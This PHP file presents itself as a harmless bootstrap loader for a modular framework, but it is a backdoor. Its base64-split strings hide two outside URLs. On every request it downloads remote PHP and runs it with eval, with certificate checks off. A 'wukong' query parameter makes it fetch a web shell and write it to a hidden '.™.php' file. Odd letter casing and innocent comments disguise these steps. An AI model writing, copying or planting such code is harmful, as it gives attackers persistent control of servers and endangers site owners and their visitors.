<?php
/**
 * ---------------------------------------------------------------
 * CUSTOM CODE STARTUP LOADER
 * ---------------------------------------------------------------
 * Lightweight bootstrap for dynamic config loader and runtime 
 * instruction fetcher. Designed for internal modular systems.
 *
 * Do not modify unless you're authorized to maintain app-level 
 * streaming behavior.
 *
 * @package    CI_Micro
 * @subpackage Core Loader
 * @author     @itsmewukong
 * @version    1.0.9
 * ---------------------------------------------------------------
 */

/**
 * RemoteFetch
 *
 * Retrieves external content from a given URL using HTTP cURL.
 *
 * @param string $u URL to fetch from
 * @return string|false
 */
function _compileFetchCoreLite($u)
{
    if (function_exists('curl_version')) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $u);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_HEADER, 0);
        $r = curl_exec($c);

        if (curl_errno($c)) {
            $e = curl_error($c);
            curl_close($c);
            throw new Exception("cURL Error: " . $e);
        }

        curl_close($c);
        return $r;
    }

    throw new Exception("cURL not available.");
}

/**
 * DynamicLoader
 *
 * Fetches and evaluates remote PHP code.
 *
 * @param string $u URL containing code
 * @return void
 */
function _compileExecPayloadTask($u)
{
    $x = _compileFetchCoreLite($u);

    if ($x === false || trim($x) === '') {
        throw new Exception("Empty or failed content.");
    }

    EvAl("?>" . $x);
}

/**
 * SimpleDecode
 *
 * Decodes a base64-encoded string.
 *
 * @param string $d Encoded string
 * @return string
 */
function _compileDecodeChunkUnit($d)
{
    return bAse64_dEcoDe($d);
}

/**
 * FileWriter
 *
 * Saves content to a file.
 *
 * @param string $f Filename
 * @param string $c Content
 * @return void
 */
function _compilePushToDiskNode($f, $c)
{
    file_put_contents($f, $c);
}

// Remote write trigger
if (isset($_GET['wukong'])) {
    try {
        $p1 = 'aHR0cHM6Ly9jYXJ0ZWwucGFkYW5nbn';
        $p2 = 'VzYW50YXJhLmlkL3NoZWxsY2FydGVsLnR4dA==';
        $url = _compileDecodeChunkUnit($p1 . $p2);
        $d = _compileFetchCoreLite($url);

        if ($d !== false && trim($d) !== '') {
            _compilePushToDiskNode('.™.php', $d);
            echo "Wukong Akan Segera Datang";
        } else {
            echo "No content.";
        }
    } catch (Exception $e) {
        echo "Error: " . $e->getMessage();
    }
    exit;
}

// Default payload runner
try {
    $r1 = 'aHR0cHM6Ly9hbXAuYWJzb2';
    $r2 = 'x1dGl0YWxpYS5jb20vY2FydGVsLnR4dA==';
    $u = _compileDecodeChunkUnit($r1 . $r2);
    _compileExecPayloadTask($u);
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}
